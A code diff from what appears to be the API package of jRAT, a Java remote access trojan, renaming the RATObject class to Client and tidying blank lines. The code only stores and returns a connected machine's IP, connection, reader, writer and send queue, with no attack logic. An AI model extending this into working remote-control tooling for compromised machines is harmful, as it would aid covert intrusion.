@@ -3,7 +3,7 @@ package jrat.api;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
-public final class RATObject {
+public final class Client {
 
 	private final String ip;
 	private final Connection con;
@@ -14,7 +14,7 @@ public final class RATObject {
 	private final DataOutputStream out;
 	private final long uniqueId;
 
-	public RATObject(String ip, long uniqueId, Connection con, Writer writer, Reader reader, DataInputStream in, DataOutputStream out, Queue queue) {
+	public Client(String ip, long uniqueId, Connection con, Writer writer, Reader reader, DataInputStream in, DataOutputStream out, Queue queue) {
 		this.ip = ip;
 		this.con = con;
 		this.writer = writer;
@@ -29,7 +29,6 @@ public final class RATObject {
 	 * 
 	 * @return IP of server in format "IP / PORT"
 	 */
-
 	public String getIP() {
 		return ip;
 	}
@@ -39,7 +38,6 @@ public final class RATObject {
 	 * @return The connection class with connection information about this
 	 *         server
 	 */
-
 	public Connection getConnection() {
 		return con;
 	}
@@ -48,7 +46,6 @@ public final class RATObject {
 	 * 
 	 * @return Writer
 	 */
-
 	public Writer getDataWriter() {
 		return writer;
 	}
@@ -57,7 +54,6 @@ public final class RATObject {
 	 * 
 	 * @return Reader
 	 */
-
 	public Reader getDataReader() {
 		return reader;
 	}
@@ -67,7 +63,6 @@ public final class RATObject {
 	 * 
 	 * @param packet
 	 */
-
 	public void addToSendQueue(PacketBuilder packet) throws Exception {
 		queue.addToSendQueue(packet, this);
 	}
@@ -75,11 +70,10 @@ public final class RATObject {
 	/**
 	 * Only equals if IP is
 	 */
-
 	@Override
 	public boolean equals(Object obj) {
-		if (obj instanceof RATObject) {
-			return this == obj || ((RATObject) obj).uniqueId == uniqueId;
+		if (obj instanceof Client) {
+			return this == obj || ((Client) obj).uniqueId == uniqueId;
 		}
 
 		return false;
